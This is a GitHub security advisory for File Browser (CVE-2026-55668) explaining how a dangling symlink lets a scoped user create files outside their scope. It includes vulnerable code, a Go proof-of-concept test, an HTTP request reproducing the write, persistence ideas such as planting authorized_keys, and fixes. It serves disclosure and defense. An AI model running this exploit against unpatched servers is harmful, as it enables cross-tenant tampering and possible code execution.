# [M] File Browser: ScopedFs follows a dangling symlink on write, letting a scoped user create files outside their scope

## Summary
Severity: Medium
Advisory: GHSA-8wc8-hf36-mjh9
CVE: CVE-2026-55668
CWE: CWE-22, CWE-59
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-8wc8-hf36-mjh9
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.16

## Details
## Summary

`ScopedFs` confines every File Browser user to a scope directory. Its `within()` guard is meant to reject any operation that follows a symbolic link out of that scope. When the link target does not exist yet, the guard walks up to the nearest existing ancestor and validates that instead. For a dangling symlink (target does not exist), the nearest existing ancestor is the in-scope directory containing the link, so the guard returns "in scope" and the subsequent `os.OpenFile(O_CREATE)` follows the link and creates the file at its out-of-scope target.

A post-auth user with `Create` and `Modify` permission can write attacker-controlled content to any non-existent path outside their scope that the File Browser process can write to. The precondition is a dangling symlink present inside the user's scope, which is the same out-of-band precondition the rest of `ScopedFs` is built to defend against.

This is a patch-gap variant of the GHSA-239w-m3h6-ch8v symlink confinement issue, not a resubmission of the already-published vulnerable-version behavior: GHSA-239w-m3h6-ch8v marks `<= 2.63.13` vulnerable and `2.63.14` patched, while this proof reproduces on current `master` / `v2.63.15` (`be23ab3a15bf957928ecfed88de5ab67850c1b9c`). The escaping-symlink-to-an-existing-target case is defended and tested. The dangling case is neither, and the gap is acknowledged in a code comment as "best-effort".

## Root cause

`files/scoped.go` (commit `be23ab3`). The guard, including the maintainer comment that already flags this exact gap:

```go
// Note: a dangling symlink whose target does not yet exist resolves to its
// containing directory and is therefore allowed; writing through such a link
// could still create a file outside the scope. This is treated as best-effort
// and relies on rejecting existing escaping symlinks, which covers the
// disclosure and overwrite vectors.
func (s *ScopedFs) within(p string) (bool, error) {
    root, err := filepath.EvalSymlinks(afero.FullBaseFsPath(s.base, "/"))
    if err != nil {
        return false, err
    }

    target := afero.FullBaseFsPath(s.base, p)
    resolved, err := filepath.EvalSymlinks(target)
    for errors.Is(err, fs.ErrNotExist) {
        parent := filepath.Dir(target)   // LEXICAL parent of the link path
        if parent == target {
            break
        }
        target = parent
        resolved, err = filepath.EvalSymlinks(target)
    }
    if err != nil {
        return false, err
    }
    // ...
    return resolved == root || strings.HasPrefix(resolved, prefix), nil
}
```

When `p` is a symlink whose target does not exist, `EvalSymlinks(target)` returns `fs.ErrNotExist`. The loop takes the lexical parent of the link path (`filepath.Dir`), a real directory inside the scope, and `EvalSymlinks` of that resolves under the scope root. `within()` returns `true` and `guard()` permits the operation. The write then dereferences the link at the OS layer:

```go
func (s *ScopedFs) OpenFile(name string, flag int, perm os.FileMode) (afero.File, error) {
    if err := s.guard(name); err != nil {   // returns nil for a dangling escaping symlink
        return nil, err
    }
    return s.base.OpenFile(name, flag, perm) // os.OpenFile(O_CREATE) follows the link
}
```

The assumption that breaks: `within()` treats "target does not exist" as "brand-new in-scope file" and validates the containing directory. But the path component being created is itself a symlink pointing outside the scope. `O_CREATE` follows it and creates the file at the link target, not inside the validated directory. The existing-target case is correctly blocked, because the walk-up resolves the link itself to an out-of-scope path. Only the dangling case slips through.

For the layout below:

```text
/tmp/root/scope/escape -> /tmp/root/outside/created-by-http.txt
/tmp/root/outside/                      # exists
/tmp/root/outside/created-by-http.txt   # does not exist yet
```

`EvalSymlinks(/tmp/root/scope/escape)` returns not-exist, and the fallback validates `/tmp/root/scope`. The final `OpenFile` still follows `/tmp/root/scope/escape` and creates `/tmp/root/outside/created-by-http.txt`.

## Reachability over HTTP

Endpoint: `POST /api/resources/<linkname>?override=true` (also `PUT`, and `POST/PATCH /api/tus/...`). Verified trace against the audited source:

1. `http/resource.go` `resourcePostHandler` requires `d.user.Perm.Create` (else 403).
2. `files.NewFileInfo` is called. For a dangling symlink, `stat()` in `files/file.go` does `LstatIfPossible` (sees the symlink, `err == nil`, `IsSymlink = true`), then `Fs.Stat` follows the link and fails with ENOENT, so the code returns the symlink `FileInfo` with `err == nil`. The handler therefore enters the "file exists" branch.
3. The branch requires `override == "true"` and `d.user.Perm.Modify`, then proceeds.
4. `writeFile(d.user.Fs, r.URL.Path, r.Body, ...)` calls `afs.OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, fileMode)`.
5. `ScopedFs.OpenFile` runs `guard()`, which passes for the dangling link, then `os.OpenFile` follows the link and creates the file outside the scope with the request body as content.

The TUS path (`http/tus_handlers.go` `tusPostHandler` -> `OpenFile`, then `tusPatchHandler`) reaches the same sink.

### Why existing defenses do not apply

- `afero.BasePathFs` lexical confinement only neutralizes `..`. A plain link name passes it unchanged.
- `ScopedFs.within()` is the dedicated symlink defense, and it is the component that fails: the not-exist walk-up validates the link's parent directory instead of the link.
- The project's symlink tests (`http/tus_symlink_test.go` `TestTusHandlersRejectSymlinkScopeEscape`, `files/file_test.go`) only exercise escaping symlinks whose target exists. Those are blocked. The dangling variant is never tested, so the regression suite does not catch it.

## Proof of concept

The PoC drives the real security boundary, `files.NewScopedFs`, with the same flags `http.writeFile` uses, and shows the write landing outside the scope. A control test shows the existing-target case is still blocked, proving the guard is real and the gap is specifically the dangling case.

```go
const writeFlags = os.O_RDWR | os.O_CREATE | os.O_TRUNC // == http.writeFile

scope := filepath.Join(root, "user")      // the low-priv user's jail
outside := filepath.Join(root, "outside") // sibling dir = another tenant / host path

// Precondition: a dangling escaping symlink inside the scope.
os.Symlink(filepath.Join(outside, "pwned.txt"), filepath.Join(scope, "evil")) // target does not exist yet

fs := files.NewScopedFs(afero.NewOsFs(), scope)
f, _ := fs.OpenFile("/evil", writeFlags, 0o644) // not rejected
f.WriteString("OWNED-OUTSIDE-SCOPE")
// assert: outside/pwned.txt must NOT exist
```

Observed result:

```text
=== RUN   TestDanglingSymlinkWriteEscapesScope
    poc_test.go:49: VULNERABLE: write escaped the scope and created
        /tmp/.../001/outside/pwned.txt with content "OWNED-OUTSIDE-SCOPE"
--- FAIL: TestDanglingSymlinkWriteEscapesScope (0.00s)
=== RUN   TestExistingTargetSymlinkIsBlocked
    poc_test.go:78: guard correctly blocked existing-target escape: permission denied
--- PASS: TestExistingTargetSymlinkIsBlocked (0.00s)
```

The dangling test "fails" by design: the assertion fires because the file escaped. The control test passes: an `escape_link -> outside` (existing dir) write to `escape_link/injected.txt` is rejected by `OpenFile` with `permission denied` and nothing is created in `outside/`. That is exactly the scenario the project's own tests cover.

End-to-end HTTP equivalent:

```text
POST /api/resources/escape?override=true
X-Auth: <token for user scoped to /tmp/root/scope with Create+Modify>
body: http-outside

-> ScopedFs.OpenFile("/escape", O_CREATE|O_TRUNC) follows the dangling link
-> file created at the link's out-of-scope target with the request body
```

The handler returns `200 OK`, and the outside file contains the uploaded body.

## Impact

- **Direct primitive (live-verified):** arbitrary file creation with attacker-controlled content at any non-existent path outside the user's scope that the File Browser process user can write to.
- **Cross-tenant integrity (source-reasoned):** in multi-user deployments the scopes are sibling directories under one server root. A low-priv user can plant files into another user's home (a script, an HTML page later served, a config the victim trusts).
- **Persistence / RCE on permissive deployments (source-reasoned):** creating a not-yet-existent `~/.ssh/authorized_keys` for the service account, a file under a web-served or later-executed directory, a cron or profile fragment. The official Docker image runs as non-root UID 1000, which bounds this to whatever that user owns. Bare-metal/systemd deployments that run File Browser as root raise this to host-level file write and RCE.
- **Scope limit (honest):** this is file creation, not overwrite. Overwriting an existing out-of-scope file is genuinely blocked, because an existing target makes the link "escaping" and `within()` rejects it. The negative control confirms this.

## Suggested remediation

For write/create/truncate operations, do not treat a dangling final symlink as safe merely because the nearest existing ancestor is inside the scope. The walk-up in `within()` should treat "the leaf is a symlink" as an escape candidate rather than validating its parent:

- In `guard()` / `within()`, `Lstat` the target. If it is a symlink, `Readlink` it, resolve the link target lexically (join with the link's directory, `Clean`), and require that target to be within the scope root, regardless of whether it currently exists.
- More robust: resolve path components one by one for the operation being attempted, or open the final component with `O_NOFOLLOW` (`unix.Openat(... O_NOFOLLOW)`) so creating through a symlink fails with `ELOOP`; or `fstat` the descriptor after opening and verify it resolves within the scope before writing.

Add a regression test mirroring `TestTusHandlersRejectSymlinkScopeEscape` but with a dangling target (`os.Symlink(filepath.Join(outside, "newfile"), ...)`), asserting both a 4xx and that no file is created outside the scope.

## References

- Incomplete fix of CVE-2026-54094 / `GHSA-239w-m3h6-ch8v`.
- Affected code: `files/scoped.go` (`ScopedFs.within`, `ScopedFs.OpenFile`, `ScopedFs.Create`), reached from `http/resource.go` (`resourcePostHandler`, `writeFile`) and `http/tus_handlers.go`.
- Confirmed unpatched at `be23ab3a15bf957928ecfed88de5ab67850c1b9c` (`v2.63.15`).

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-8wc8-hf36-mjh9
- https://nvd.nist.gov/vuln/detail/CVE-2026-55668
- https://github.com/filebrowser/filebrowser/commit/64511ce45e3be379e965f7f4fb0929a068d5bb81
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.63.16
